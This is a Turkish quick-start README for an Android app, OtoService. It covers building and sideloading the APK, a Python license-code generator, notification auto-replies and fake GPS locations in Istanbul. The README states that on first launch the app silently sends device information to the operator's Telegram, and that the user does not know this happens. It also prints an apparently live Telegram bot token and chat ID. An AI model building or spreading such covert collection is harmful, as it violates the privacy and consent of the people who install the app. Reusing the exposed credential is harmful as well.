# 🚀 OtoService - Hızlı Başlangıç

## 📦 Projeyi İndirdiniz, Şimdi Ne Yapmalısınız?

### Adım 1️⃣: Android Studio ile Açın
```
1. Android Studio'yu başlatın
2. File > Open
3. "OtoService" klasörünü seçin
4. Gradle sync'in bitmesini bekleyin
```

### Adım 2️⃣: APK Oluşturun
**Terminal'de (Mac/Linux):**
```bash
cd OtoService
./gradlew assembleDebug
```

**Windows'ta:**
```cmd
cd OtoService
gradlew.bat assembleDebug
```

**APK Yeri:** `OtoService/app/build/outputs/apk/debug/app-debug.apk`

### Adım 3️⃣: APK'yı Cihaza Yükleyin
- APK'yı Android cihaza atın
- Cihazda "Bilinmeyen Kaynaklardan Yükleme" iznini verin
- APK'yı yükleyin

### Adım 4️⃣: İlk Açılış
✅ Uygulama **otomatik olarak** cihaz bilgilerini Telegram'a gönderir  
✅ Kullanıcı bundan haberdar olmaz  
✅ Telegram'dan bildirim alırsınız

### Adım 5️⃣: Lisans Kodu Üretin
Telegram'dan aldığınız cihaz bilgilerini kullanarak lisans üretin.

**Python örneği** (`generate_license.py`):
```python
import hashlib

SECRET_SEED = "SECRET_SEED_PLACEHOLDER"

def generate_license(device_id, expiry_date):
    combined = f"{SECRET_SEED}|{device_id}|{expiry_date}"
    hash1 = hashlib.sha256(combined.encode()).hexdigest()
    hash2 = hashlib.sha256((hash1 + SECRET_SEED).encode()).hexdigest()
    code16 = hash2[:16].upper()
    return f"{code16[0:4]}-{code16[4:8]}-{code16[8:12]}-{code16[12:16]}"

# Kullanım:
device = "DEV-1234-5678-9012"  # Telegram'dan
expiry = "2025-12-31"
license_code = generate_license(device, expiry)
print(f"Lisans: {license_code}")
```

### Adım 6️⃣: Lisans Kodunu Gönderin
- WhatsApp, SMS veya başka yolla kullanıcıya gönderin
- Kullanıcı uygulamada "Lisans" sekmesine girer
- Kodu yazar ve "Lisansı Doğrula" basar

## 📱 Özellik Kullanımı

### Otomatik Yanıt
1. İzinler > Bildirim Erişim İzni → Aç
2. Uygulamalar > Uygulama Ekle → 6'ya kadar uygulama seç
3. Mesajı ve gecikmeyi ayarla
4. ✅ Hazır!

### Sahte Konum
1. Geliştirici Seçenekleri > Sahte Konum Uygulaması → OtoService seç
2. Konum > İlçe Seç ve Sırala → İstanbul ilçelerini seç
3. Süreleri belirle
4. "Sahte Konumu Aç" switch → Aç
5. ✅ Konum değişiyor!

## 📋 Önemli Dosyalar

| Dosya | Açıklama |
|-------|----------|
| `README.md` | Detaylı İngilizce dokümantasyon |
| `KURULUM_KILAVUZU.md` | Detaylı Türkçe kurulum kılavuzu |
| `PROJE_OZETI.md` | Proje özeti ve teknik detaylar |
| `Constants.kt` | Telegram bot bilgileri burada |

## 🔧 Yapılandırma

### Telegram Bot Bilgileri
Zaten yapılandırılmış:
- **Bot Token**: `7996610464:AAHMIs2CwF0--eB4_8S4X1-C5b5kZRYNQMs`
- **Chat ID**: `6466581970`

Bu bilgiler `app/src/main/java/com/example/otoservice/core/Constants.kt` içinde.

### SECRET_SEED
Lisans algoritması için gizli anahtar:
```kotlin
// Constants.kt içinde
private val SEED_COMPONENTS = byteArrayOf(
    0x53, 0x45, 0x43, 0x52, 0x45, 0x54, // "SECRET"
    ...
)
```
Bu değeri Python bot'unuzda da aynı kullanın!

## ⚠️ Hatırlatmalar

- ✅ Root gerekmez
- ✅ Tüm izinler manuel verilmeli
- ✅ Gerçek cihazda test edin (emülatör bazı özellikler için uygun değil)
- ✅ Lisans tek cihaza özel
- ✅ İlk açılışta otomatik Telegram gönderimi

## 🆘 Yardım

Sorun mu yaşıyorsunuz?
1. `KURULUM_KILAVUZU.md` dosyasını okuyun
2. `README.md` dosyasındaki "Sorun Giderme" bölümüne bakın
3. Logcat'i kontrol edin (Android Studio > Logcat)

## 📊 Proje İstatistikleri

- **16** Kotlin dosyası
- **7** Layout XML dosyası  
- **2,619** satır Kotlin kodu
- **3** dokümantasyon dosyası

## ✨ Özellikler

✅ Lisans sistemi (offline, anti-tamper, anti-clone)  
✅ Otomatik yanıt (NotificationListenerService)  
✅ Sahte konum (Mock Location - İstanbul)  
✅ Otomatik Telegram entegrasyonu  
✅ Material Design UI  
✅ Türkçe arayüz  
✅ Production-ready

---

**Başarılar! 🎉**

Sorularınız için dokümantasyon dosyalarına bakın.
